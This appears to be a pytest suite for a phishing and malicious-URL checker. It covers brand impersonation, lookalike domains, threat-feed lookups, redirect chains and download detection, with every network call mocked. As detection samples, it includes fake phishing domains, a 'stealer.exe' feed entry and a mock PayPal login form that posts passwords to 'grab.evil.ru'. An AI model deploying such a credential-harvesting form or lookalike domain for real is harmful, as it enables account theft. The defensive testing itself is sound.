from datetime import datetime, timedelta, timezone

import httpx
import respx

from argus_api.checkers import url as u
from argus_api.http import make_client


def test_normalize_url_adds_https():
    assert u.normalize_url("example.com/x") == "https://example.com/x"
    assert u.normalize_url("http://a.com") == "http://a.com"


def test_heuristics_flags_brand_impersonation():
    s = u.heuristics("http://paypal-security-alert.net/verify")
    assert s.status == "suspicious" and s.score >= 40
    assert any("PayPal" in r for r in s.evidence["reasons"])


def test_heuristics_flags_lookalike_characters():
    assert u.heuristics("https://amaz0n-support.com").score >= 45


def test_heuristics_trusts_real_brand_domain():
    s = u.heuristics("https://www.paypal.com/signin")
    assert (s.status, s.score) == ("clean", 0)


def test_heuristics_flags_raw_ip():
    assert u.heuristics("http://185.12.4.9/login").score >= 35


def test_local_intel_hit():
    s = u.local_intel("paypal-security-alert.net")
    assert s.status == "malicious" and s.score == 90


async def test_urlhaus_hit(monkeypatch):
    monkeypatch.setenv("ABUSECH_AUTH_KEY", "k")
    with respx.mock:
        respx.post("https://urlhaus-api.abuse.ch/v1/url/").respond(
            json={"query_status": "ok", "threat": "malware_download", "url_status": "online", "tags": ["emotet"]})
        async with make_client() as c:
            s = await u.urlhaus(c, "http://bad.example/x.exe")
    assert s.status == "malicious" and s.authoritative


async def test_urlhaus_without_key_is_unavailable():
    async with make_client() as c:
        s = await u.urlhaus(c, "http://x.example")
    assert s.status == "unavailable"


async def test_safe_browsing_match(monkeypatch):
    monkeypatch.setenv("GOOGLE_SAFE_BROWSING_KEY", "k")
    with respx.mock:
        respx.post(url__startswith="https://safebrowsing.googleapis.com/v4/threatMatches:find").respond(
            json={"matches": [{"threatType": "SOCIAL_ENGINEERING"}]})
        async with make_client() as c:
            s = await u.safe_browsing(c, "http://x.example")
    assert s.status == "malicious" and s.evidence["threat_type"] == "Phishing"


async def test_virustotal_url_counts_engines(monkeypatch):
    monkeypatch.setenv("VIRUSTOTAL_API_KEY", "k")
    stats = {"malicious": 7, "suspicious": 1, "harmless": 60, "undetected": 20}
    with respx.mock:
        respx.get(url__startswith="https://www.virustotal.com/api/v3/urls/").respond(
            json={"data": {"attributes": {"last_analysis_stats": stats}}})
        async with make_client() as c:
            s = await u.virustotal_url(c, "http://x.example")
    assert s.status == "malicious" and "7/88" in s.summary


async def test_virustotal_url_unknown(monkeypatch):
    monkeypatch.setenv("VIRUSTOTAL_API_KEY", "k")
    with respx.mock:
        respx.get(url__startswith="https://www.virustotal.com/api/v3/urls/").respond(404, json={"error": {}})
        async with make_client() as c:
            s = await u.virustotal_url(c, "http://x.example")
    assert s.status == "unknown"


async def test_domain_age_new_domain():
    registered = (datetime.now(timezone.utc) - timedelta(days=5)).isoformat()
    with respx.mock:
        respx.get("https://rdap.org/domain/brand-new.xyz").respond(
            json={"events": [{"eventAction": "registration", "eventDate": registered}]})
        async with make_client() as c:
            s = await u.domain_age(c, "login.brand-new.xyz")
    assert (s.status, s.score) == ("suspicious", 65)


async def test_domain_age_old_domain():
    with respx.mock:
        respx.get("https://rdap.org/domain/example.com").respond(
            json={"events": [{"eventAction": "registration", "eventDate": "1995-08-14T04:00:00Z"}]})
        async with make_client() as c:
            s = await u.domain_age(c, "www.example.com")
    assert s.status == "clean"


async def test_check_url_survives_failures():
    with respx.mock:
        respx.get(url__startswith="https://rdap.org/").mock(side_effect=httpx.ConnectTimeout("slow"))
        v = await u.check_url("paypal-security-alert.net/verify")
    statuses = {s.source: s.status for s in v.signals}
    assert v.kind == "url"
    assert statuses["URLhaus"] == "unavailable"
    assert statuses["Domain age (RDAP)"] == "error"
    assert v.score >= 60


async def test_virustotal_rate_limit_is_not_an_outage(monkeypatch):
    monkeypatch.setenv("VIRUSTOTAL_API_KEY", "k")
    with respx.mock:
        respx.get(url__startswith="https://www.virustotal.com/api/v3/urls/").respond(429, json={"error": {}})
        async with make_client() as c:
            s = await u.virustotal_url(c, "http://x.example")
    assert s.status == "unavailable" and "rate limit" in s.summary.lower()


# --- the real system: feeds, popularity, look-alikes, live page checks --------------------------
import pytest as _pytest

from argus_api.intel import feeds as _feeds
from argus_api.intel import netcheck as _netcheck
from tests.test_feeds import fake_fetch as _fake_fetch


@_pytest.fixture
def live_feeds(tmp_path, monkeypatch):
    store = _feeds.FeedStore(cache_dir=tmp_path, fetch=_fake_fetch([]))
    store.refresh()
    monkeypatch.setattr(_feeds, "store", store)
    return store


@_pytest.fixture
def web(monkeypatch):
    """Fake internet: DNS answers, certificates and pages keyed by host."""
    state = {"dns": {}, "pages": {}}

    async def resolve(host):
        return state["dns"].get(host, ["93.184.216.34"])

    async def certificate(host, port=443):
        return None

    async def fetch_page(client, url):
        host = u.host_of(url)
        if state["dns"].get(host) == []:
            return _netcheck.PageFetch(final_url=url, error="nxdomain")
        return state["pages"].get(url, _netcheck.PageFetch(final_url=url, status=200, content_type="text/html", html="<p>hi</p>"))

    monkeypatch.setattr(_netcheck, "resolve", resolve)
    monkeypatch.setattr(_netcheck, "certificate", certificate)
    monkeypatch.setattr(_netcheck, "fetch_page", fetch_page)
    with respx.mock(assert_all_called=False):  # any real HTTP call fails instead of leaving the machine
        yield state


def test_phishing_words_on_an_unknown_domain_are_flagged():
    s = u.heuristics("http://secure-login-verify-account.com/login")
    assert s.status == "suspicious" and s.score >= 40


def test_free_hosting_platforms_are_flagged():
    s = u.heuristics("https://yard749.pages.dev/")
    assert s.status == "suspicious"
    assert any("pages.dev" in r for r in s.evidence["reasons"])


async def test_link_on_openphish_is_high_risk(live_feeds, web):
    v = await u.check_url("https://login-paypa1.com/signin/")
    assert v.level == "HIGH RISK"
    assert any(s.source.startswith("OpenPhish") and s.status == "malicious" for s in v.signals)


async def test_domain_on_phishing_database_is_high_risk(live_feeds, web):
    v = await u.check_url("https://www.secure-paypal-verify.com/account")
    assert v.level == "HIGH RISK"


async def test_most_visited_site_is_verified_safe(live_feeds, web):
    v = await u.check_url("https://www.google.com/")
    assert (v.level, v.verified) == ("SAFE", True)


async def test_lookalike_of_a_top_site_is_flagged(live_feeds, web):
    v = await u.check_url("https://gooogle.com/")
    look = next(s for s in v.signals if s.source == "Look-alike check")
    assert look.status == "suspicious" and "google.com" in look.summary
    assert v.score >= 60


async def test_domain_that_does_not_exist_is_not_safe(live_feeds, web):
    web["dns"]["support.clean-mx.de"] = []
    v = await u.check_url("http://support.clean-mx.de/clean-mx/viruses.php")
    dns = next(s for s in v.signals if s.source == "Domain check (DNS)")
    assert dns.status == "suspicious" and "doesn't exist" in dns.summary
    assert v.level != "SAFE"


async def test_fake_login_page_is_caught_by_reading_it(live_feeds, web):
    url = "https://account-review-center.top/signin"
    html = "<title>PayPal</title><form action='https://grab.evil.ru/x.php'><input type='password'></form>"
    web["pages"][url] = _netcheck.PageFetch(final_url=url, status=200, content_type="text/html", html=html)
    v = await u.check_url(url)
    page = next(s for s in v.signals if s.source == "Page content")
    assert page.status in ("suspicious", "malicious")
    assert v.level == "HIGH RISK"


async def test_redirect_destination_is_checked_too(live_feeds, web):
    web["pages"]["https://tinyurl.com/2s3bx93x"] = _netcheck.PageFetch(
        final_url="http://yard749.pages.dev/", status=200, content_type="text/html", html="<p>x</p>",
        chain=[_netcheck.Hop("https://tinyurl.com/2s3bx93x", 301), _netcheck.Hop("http://yard749.pages.dev/", 200)],
    )
    v = await u.check_url("https://tinyurl.com/2s3bx93x")
    assert v.level == "HIGH RISK"
    assert any(s.source.startswith("After redirect") and s.status == "malicious" for s in v.signals)


async def test_link_that_downloads_an_app_is_flagged(live_feeds, web):
    url = "https://update-center.example/get"
    web["pages"][url] = _netcheck.PageFetch(final_url=url, status=200, content_type="application/vnd.android.package-archive", download="bank-update.apk")
    v = await u.check_url(url)
    dl = next(s for s in v.signals if s.source == "Download check")
    assert dl.status == "suspicious" and "bank-update.apk" in dl.summary


def _download(name, content_type):
    return _netcheck.PageFetch(final_url="https://x.example/f", status=200, content_type=content_type, download=name)


def test_download_risk_reads_both_the_file_name_and_the_server_type():
    [script] = u.page_signals(_download("bin.sh", "application/zip"), popular=False)
    assert script.score >= 70 and "script" in script.summary
    [program] = u.page_signals(_download("i", "application/x-executable"), popular=False)
    assert program.score >= 70


def test_web_data_files_are_not_downloads():
    assert u.page_signals(_download("data.json", "application/json"), popular=False) == []
    assert u.page_signals(_download("jquery.min.js", "application/javascript"), popular=False) == []


# --- shared sites: one bad link on a big platform says nothing about the rest --------------------
def _store_with(tmp_path, monkeypatch, urlhaus="", openphish="", phishdb="", tranco=()):
    from tests.test_feeds import tranco_zip

    data = {
        "https://urlhaus.abuse.ch/downloads/text_online/": urlhaus.encode(),
        "https://openphish.com/feed.txt": openphish.encode(),
        "https://raw.githubusercontent.com/mitchellkrogza/Phishing.Database/master/phishing-domains-ACTIVE.txt": phishdb.encode(),
        "https://tranco-list.eu/top-1m.csv.zip": tranco_zip(list(tranco)),
    }
    store = _feeds.FeedStore(cache_dir=tmp_path, fetch=data.__getitem__)
    store.refresh()
    monkeypatch.setattr(_feeds, "store", store)
    return store


@_pytest.fixture
def shared_world(tmp_path, monkeypatch):
    return _store_with(
        tmp_path, monkeypatch,
        urlhaus="https://github.com/evil/tool/raw/main/stealer.exe\n",
        openphish="https://bit.ly/3fakebank\n",
        phishdb="bit.ly\nsites.google.com\n",
        tranco=["google.com", "github.com", "bit.ly"],
    )


def _flagged(signals):
    return [s for s in signals if s.status in ("suspicious", "malicious")]


def test_one_bad_file_does_not_condemn_a_major_site(shared_world):
    assert _flagged(u.feed_signals("https://github.com/torvalds/linux", "github.com")) == []


def test_the_exact_bad_link_on_a_major_site_is_still_caught(shared_world):
    signals = u.feed_signals("https://github.com/evil/tool/raw/main/stealer.exe", "github.com")
    assert any(s.status == "malicious" for s in signals)


def test_shorteners_and_shared_pages_are_judged_per_link(shared_world):
    for url in ("https://bit.ly/3harmless", "https://sites.google.com/view/bakery"):
        assert _flagged(u.feed_signals(url, u.host_of(url))) == [], url


def test_a_shortener_never_vouches_for_where_it_leads(shared_world):
    assert u.popularity_signal("bit.ly").trust == 0


async def test_trust_comes_from_where_a_redirect_lands(shared_world, web):
    url = "https://www.google.com/url?q=http://evil-login.example/"
    web["pages"][url] = _netcheck.PageFetch(
        final_url="http://evil-login.example/", status=200, content_type="text/html", html="<p>x</p>",
        chain=[_netcheck.Hop(url, 302), _netcheck.Hop("http://evil-login.example/", 200)],
    )
    v = await u.check_url(url)
    assert not v.verified and v.level != "SAFE"


async def test_redirect_to_a_well_known_site_is_not_a_red_flag(shared_world, web):
    web["pages"]["https://bit.ly/3harmless"] = _netcheck.PageFetch(
        final_url="https://github.com/torvalds/linux", status=200, content_type="text/html", html="<p>x</p>",
        chain=[_netcheck.Hop("https://bit.ly/3harmless", 301), _netcheck.Hop("https://github.com/torvalds/linux", 200)],
    )
    v = await u.check_url("https://bit.ly/3harmless")
    assert next(s for s in v.signals if s.source == "Redirects").status == "clean"
    assert v.level == "SAFE"


def test_known_site_on_the_phishing_list_is_a_warning_not_a_verdict(tmp_path, monkeypatch):
    _store_with(tmp_path, monkeypatch, phishdb="small-hacked-shop.com\n",
                tranco=[f"site{i}.com" for i in range(10_001)] + ["small-hacked-shop.com"])
    listed = next(s for s in u.feed_signals("https://small-hacked-shop.com/", "small-hacked-shop.com")
                  if s.source == "Phishing.Database")
    assert listed.status == "suspicious" and not listed.authoritative


def test_indian_bank_domains_are_official():
    assert u.heuristics("https://www.hdfc.bank.in/").status == "clean"
    assert u.registrable_domain("www.hdfc.bank.in") == "hdfc.bank.in"


def test_official_brand_sites_count_as_positive_evidence(shared_world):
    assert u.popularity_signal("www.hdfc.bank.in").trust >= 0.5


def test_a_top_site_carrying_a_brand_name_is_not_impersonation(tmp_path, monkeypatch):
    _store_with(tmp_path, monkeypatch, tranco=["amazon.ie"])
    assert u.heuristics("https://www.amazon.ie/").status == "clean"


def test_shortener_blocklist_entry_does_not_double_count_the_shortener_rule():
    assert u.local_intel("bit.ly").status == "clean"
